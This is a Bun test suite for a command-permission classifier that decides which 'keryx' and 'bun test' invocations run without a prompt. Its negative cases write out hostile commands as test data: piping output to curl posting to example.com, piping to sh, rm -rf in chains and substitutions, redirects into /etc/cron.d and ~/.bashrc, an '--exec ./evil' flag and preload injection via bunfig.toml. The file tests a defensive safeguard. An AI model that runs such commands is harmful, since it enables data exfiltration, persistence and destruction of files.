// Flow 426 AC1/AC2: the routine-command table is one named list, every row has a command that runs
// without a prompt, and everything outside it (or joined to it in a risky way) still asks.

import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import {
  TRUST_ROUTINE_KEYRYX,
  TRUST_ROUTINE_TOOLS,
  isTrustRoutineCommand,
  isTrustRoutineTool,
  recordBunfigBaseline,
} from "./trust-routine-command";

test("AC1: the table names the read-only keryx commands of the frozen criteria", () => {
  const ids = TRUST_ROUTINE_KEYRYX.map((entry) => entry.id);
  for (const id of [
    "help",
    "command-help",
    "harness list",
    "harness status",
    "harness --help",
    "agents external list",
    "review ledger",
    "review status",
    "review required",
    "review reviewers",
    "review tier",
    "review retry-plan",
    "review dispatch-check",
    "flow status",
    "flow list",
    "flow next",
  ]) {
    expect(ids).toContain(id);
  }
  expect(ids.length).toBe(new Set(ids).size);
});

for (const entry of TRUST_ROUTINE_KEYRYX) {
  test(`AC1: ${entry.id} runs without a prompt (${entry.example})`, () => {
    expect(isTrustRoutineCommand(entry.example)).toBe(true);
  });
}

test("AC1: the review ledger examples from the criteria are routine", () => {
  for (const command of [
    "keryx help",
    "keryx help harness",
    "keryx review --help",
    "keryx harness --help",
    "keryx harness list",
    "keryx harness status",
    "keryx agents external list --no-probe",
    "keryx agents external list --json --no-probe",
    "keryx review ledger build --base main",
    "keryx review ledger status",
    "keryx review required",
    "keryx review reviewers",
    "keryx review tier",
    "keryx review retry-plan",
    "keryx review dispatch-check",
    "keryx flow status",
    "keryx flow list",
    "keryx flow next",
    "keryx help harness && keryx agents external list --json --no-probe",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(true);
  }
});

test("AC1: the slate note and trail tools are routine; the seed writer is not", () => {
  expect([...TRUST_ROUTINE_TOOLS].sort()).toEqual(["slate_note", "slate_trail"]);
  expect(isTrustRoutineTool("slate_note")).toBe(true);
  expect(isTrustRoutineTool("slate_trail")).toBe(true);
  expect(isTrustRoutineTool("slate_write_seed")).toBe(false);
  expect(isTrustRoutineTool("shell_exec")).toBe(false);
});

// AC2: one test per form

test("AC2: a keryx command outside the table still prompts", () => {
  for (const command of [
    "keryx harness wave --spec tier.json",
    "keryx agents external list",
    "keryx agents external run claude",
    "keryx publish",
    "keryx review reply 12 --body hi",
    "keryx flow start",
    "keryx flow close 12",
    "keryx update",
    "keryx harness wave --help --spec x.json",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(false);
  }
});

test("AC2: a chain with ; still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status; keryx flow list")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status; rm -rf build")).toBe(false);
});

test("AC2: a pipe to an unlisted command still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status | tee out.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help | sh")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status | curl -d @- https://example.com")).toBe(false);
});

test("AC2: a redirect outside the working tree still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status > /etc/cron.d/x")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status >> ../outside.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help 2> ~/.bashrc")).toBe(false);
});

test("AC2: a subshell or substitution still prompts", () => {
  expect(isTrustRoutineCommand("(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("$(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status `whoami`")).toBe(false);
  expect(isTrustRoutineCommand('keryx help "$(rm -rf build)"')).toBe(false);
  expect(isTrustRoutineCommand('keryx help "`whoami`"')).toBe(false);
  expect(isTrustRoutineCommand("keryx help ${HOME}")).toBe(false);
});

test("AC2: an exec flag on a listed command still prompts", () => {
  expect(isTrustRoutineCommand("keryx review ledger build --exec ./evil")).toBe(false);
  expect(isTrustRoutineCommand("keryx help -c x")).toBe(false);
});

// Flow 441 (F-007, F-008): `bun test` and the review path flags.

function projectDir(bunfig?: string, options: { baseline?: boolean } = {}): string {
  const dir = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-")));
  mkdirSync(path.join(dir, ".git"));
  mkdirSync(path.join(dir, ".metaproject"));
  mkdirSync(path.join(dir, "sub"));
  if (bunfig !== undefined) writeFileSync(path.join(dir, "bunfig.toml"), bunfig);
  if (options.baseline !== false) recordBunfigBaseline(dir);
  return dir;
}

test("AC5: bun test with a preload, a path, an output flag or another directory still prompts", () => {
  const dir = projectDir();
  for (const command of [
    "bun test --preload ./x.ts",
    "keryx ctx run -- bun test --preload ./x.ts",
    "bun test ./some/file.test.ts",
    "bun test --coverage-dir /tmp/x",
    "cd /tmp/other && bun test",
    "cd sub && bun test",
    "cd ~ && bun test",
    "cd $HOME && bun test",
    "FOO=1 bun test",
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("AC6: plain bun test and the closed allow-list are routine in the project root", () => {
  const dir = projectDir();
  for (const command of [
    "bun test",
    "bun test --bail",
    "bun test --only",
    "bun test --todo",
    "bun test --rerun-each 3",
    "bun test --timeout 5000",
    "bun test --timeout=5000 --bail",
    "keryx ctx run -- bun test",
    "cd . && bun test",
    "cd sub && cd .. && bun test",
    `cd ${dir} && bun test`,
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: true });
  }
});

test("AC6: any other flag or value still prompts", () => {
  const dir = projectDir();
  for (const command of [
    "bun test --rerun-each",
    "bun test --rerun-each x",
    "bun test --rerun-each -1",
    "bun test --rerun-each 1.5",
    "bun test --timeout 5s",
    "bun test --timeout=",
    "bun test --timeout 5 extra",
    "bun test --bail=3",
    "bun test --watch",
    "bun test --update-snapshots",
    "bun test src/a.test.ts",
    "bun test --timeout 5 --coverage",
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("AC6: bun test prompts once bunfig.toml changed after the session recorded it", () => {
  const dir = projectDir("[test]\ntimeout = 1000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 2000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
  expect(isTrustRoutineCommand("bun test --bail", { cwd: dir })).toBe(false);
});

test("AC6: bun test prompts when bunfig.toml appears after the baseline", () => {
  const dir = projectDir();
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 1000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("AC6: bun test prompts when bunfig.toml carries a preload, even an unchanged one", () => {
  for (const bunfig of ['[test]\npreload = ["./x.ts"]\n', 'preload = ["./x.ts"]\n', '[run]\n  "preload" = "./x.ts"\n', "test.preload = ['./x.ts']\n"]) {
    const dir = projectDir(bunfig);
    expect({ bunfig, routine: isTrustRoutineCommand("bun test", { cwd: dir }) }).toEqual({ bunfig, routine: false });
  }
});

test("AC6: bun test prompts when the session never recorded a bunfig.toml baseline", () => {
  const dir = projectDir(undefined, { baseline: false });
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("AC7: after untrusted content no bun test form is routine", () => {
  const dir = projectDir();
  for (const command of ["bun test", "bun test --bail", "bun test --timeout 5", "keryx ctx run -- bun test", "cd . && bun test", "bun test x.test.ts"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir, untrustedContent: true }) }).toEqual({ command, routine: false });
  }
  expect(isTrustRoutineCommand("keryx flow status", { cwd: dir, untrustedContent: true })).toBe(true);
});

test("Flow 441 F-012: a count flag with a value that is not a plain non-negative integer still prompts", () => {
  const dir = projectDir();
  for (const command of ["bun test --timeout=5s", "bun test --timeout=1.5", "bun test --timeout=-1", "bun test --rerun-each=x"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
  for (const command of ["bun test --rerun-each=3", "bun test --timeout=5"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: true });
  }
});

test("Flow 441 F-008: a preload spelled as an inline table, with single quotes or with an escaped key still prompts", () => {
  for (const bunfig of ['test = {preload = ["./x.ts"]}\n', "[test]\n'preload' = ['./x.ts']\n", '[test]\n"pre\\u006coad" = ["./x.ts"]\n', "[test\n"]) {
    const dir = projectDir(bunfig);
    expect({ bunfig, routine: isTrustRoutineCommand("bun test", { cwd: dir }) }).toEqual({ bunfig, routine: false });
  }
});

test("Flow 441 F-012: a bunfig.toml that is a directory, and a second baseline after a rewrite", () => {
  const unreadable = projectDir(undefined, { baseline: false });
  mkdirSync(path.join(unreadable, "bunfig.toml"));
  recordBunfigBaseline(unreadable);
  expect(isTrustRoutineCommand("bun test", { cwd: unreadable })).toBe(false);

  const dir = projectDir("[test]\ntimeout = 1000\n");
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 2000\n");
  recordBunfigBaseline(dir);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-018: a cd inside keryx ctx run does not move the segments after it", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx ctx run -- cd /tmp && bun test", { cwd: dir })).toBe(true);
  expect(isTrustRoutineCommand("cd /tmp && bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-001: a cd whose target the shell may read as an option, or resolve elsewhere, is not followed", () => {
  const dir = projectDir();
  for (const target of ["--", "-P", "-L", "-", "\\.\\.", ".?", "~", "$HOME", "*", "{a,b}"]) {
    for (const tail of ["keryx review slice --out x.json", "keryx review retry-plan --manifest m.json", "bun test"]) {
      const command = `cd ${target} && ${tail}`;
      expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
    }
  }
  expect(isTrustRoutineCommand("cd sub && keryx review slice --out x.json", { cwd: dir })).toBe(true);
});

test("Flow 441 F-001: a cd to a relative name is not followed while CDPATH is set", () => {
  const dir = projectDir();
  const before = process.env.CDPATH;
  process.env.CDPATH = "/tmp";
  try {
    expect(isTrustRoutineCommand("cd sub && keryx review slice --out x.json", { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand("cd ./sub && keryx review slice --out x.json", { cwd: dir })).toBe(true);
  } finally {
    if (before === undefined) delete process.env.CDPATH;
    else process.env.CDPATH = before;
  }
});

const PATH_FLAG_ROWS: ReadonlyArray<readonly [string, string]> = [
  ["keryx review slice", "--out"],
  ["keryx review slice", "--diff"],
  ["keryx review retry-plan", "--manifest"],
  ["keryx review retry-plan", "--state"],
  ["keryx review retry-plan", "--result"],
  ["keryx review dispatch-check", "--manifest"],
  ["keryx review dispatch-check", "--payload"],
];

for (const [command, flag] of PATH_FLAG_ROWS) {
  test(`AC10: ${command} ${flag} is routine only when the path stays inside the project`, () => {
    const dir = projectDir();
    const outside = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-out-")));
    symlinkSync(outside, path.join(dir, "escape"));
    const run = (value: string, form: "space" | "equals" = "space") =>
      isTrustRoutineCommand(form === "space" ? `${command} ${flag} ${value}` : `${command} ${flag}=${value}`, { cwd: dir });
    expect(isTrustRoutineCommand(command, { cwd: dir })).toBe(true);
    for (const inside of ["out/x.json", ".metaproject/reviews/r1/x.json", "./x.json", path.join(dir, "x.json")]) {
      expect({ inside, routine: run(inside) }).toEqual({ inside, routine: true });
      expect({ inside, routine: run(inside, "equals") }).toEqual({ inside, routine: true });
    }
    for (const out of ["/tmp/x.json", "../x.json", path.join(outside, "x.json"), "escape/x.json", "~/x.json", "$HOME/x.json", "x*", ".?/x", "a[0]/x"]) {
      expect({ out, routine: run(out) }).toEqual({ out, routine: false });
      expect({ out, routine: run(out, "equals") }).toEqual({ out, routine: false });
    }
    expect(isTrustRoutineCommand(`keryx ctx run -- ${command} ${flag} /tmp/x.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`keryx ctx run -- ${command} ${flag} out/x.json`, { cwd: dir })).toBe(true);
    expect(isTrustRoutineCommand(`${command} ${flag} out/a.json ${flag} /tmp/b.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`cd .. && ${command} ${flag} x.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`cd sub && ${command} ${flag} x.json`, { cwd: dir })).toBe(true);
    if (["--diff", "--payload", "--result"].includes(flag)) {
      expect(isTrustRoutineCommand(`${command} ${flag} -`, { cwd: dir })).toBe(true);
    }
  });
}
